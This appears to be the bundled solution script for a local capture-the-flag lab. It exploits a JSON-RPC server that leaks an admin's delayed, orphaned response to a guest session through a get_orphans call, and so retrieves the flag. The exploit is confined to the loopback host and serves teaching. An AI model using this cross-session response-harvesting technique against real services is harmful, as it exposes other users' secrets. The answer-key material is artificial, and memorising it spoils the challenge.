#!/usr/bin/env python3
"""Spoiler: reproduce the shared-orphan leak in the bundled loopback lab."""
import argparse
import json
import secrets
import socket
import sys
import time


class ExploitClient:
    """Newline framing survives split UTF-8 and multiple messages per recv."""

    def __init__(self, host="127.0.0.1", port=9999):
        if host != "127.0.0.1":
            raise ValueError("This lab client uses the bundled loopback server")
        self.host, self.port = host, port
        self.sock = None
        self.buffer = b""
        self._next_id = 0

    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=3)

    def close(self):
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            self.sock.close()
            self.sock = None

    def send_request(self, method, params=None, request_id=None):
        self._next_id += 1
        req_id = request_id if request_id is not None else self._next_id
        payload = dict(jsonrpc="2.0", id=req_id, method=method, params=params or {})
        self.sock.sendall((json.dumps(payload, allow_nan=False) + "\n").encode("utf-8"))
        return req_id

    def recv_response(self, timeout=3):
        deadline = time.monotonic() + timeout
        while b"\n" not in self.buffer:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError("Timed out waiting for a complete JSON line")
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("Server disconnected")
            self.buffer += chunk
            if len(self.buffer) > 65536:
                raise ValueError("Response too large")
        line, self.buffer = self.buffer.split(b"\n", 1)
        response = json.loads(line.decode("utf-8"))
        if not isinstance(response, dict):
            raise ValueError("Response must be an object")
        return response

    def request(self, method, params=None, timeout=3):
        req_id = self.send_request(method, params)
        response = self.recv_response(timeout)
        if response.get("id") != req_id:
            raise ValueError("Response ID mismatch")
        return response

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.close()


def simulate_admin_activity(port=9999):
    """Fixture role selection, not an authentication bypass."""
    request_id = "admin-demo-" + secrets.token_hex(8)
    with ExploitClient(port=port) as admin:
        response = admin.request("login", {"username": "admin"})
        if not response.get("result", {}).get("success"):
            raise RuntimeError("Admin fixture setup failed")
        admin.send_request("get_secret", {"delay_ms": 300}, request_id=request_id)
        # The newline is sent before the FIN. The server completes the delayed
        # work after this connection closes. No race against a fixed sleep.
    return request_id


def collect_flag(attacker, request_id, timeout=3):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        response = attacker.request("get_orphans", timeout=max(.001, deadline - time.monotonic()))
        if "error" in response:
            raise RuntimeError("get_orphans failed")
        for orphan in response.get("result", {}).get("orphans", []):
            result = orphan.get("result", {})
            if orphan.get("id") == request_id and result.get("user") == "admin":
                value = result.get("secret")
                if isinstance(value, str) and value.startswith("FLAG{") and value.endswith("}"):
                    return value
        time.sleep(.02)
    return None


def exploit(port=9999):
    with ExploitClient(port=port) as attacker:
        response = attacker.request("login", {"username": "guest"})
        if not response.get("result", {}).get("success"):
            raise RuntimeError("Guest fixture setup failed")
        request_id = simulate_admin_activity(port)
        return collect_flag(attacker, request_id)


def main():
    parser = argparse.ArgumentParser(description="Bundled local CTF solution")
    parser.add_argument("--port", type=int, default=9999)
    args = parser.parse_args()
    try:
        flag = exploit(args.port)
        if flag:
            print("[PASS] FLAG retrieved:", flag)
            return 0
        print("[NO FLAG] No matching orphan before deadline (exit 1).")
        return 1
    except (OSError, ValueError, RuntimeError) as error:
        print("[ERROR]", error, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
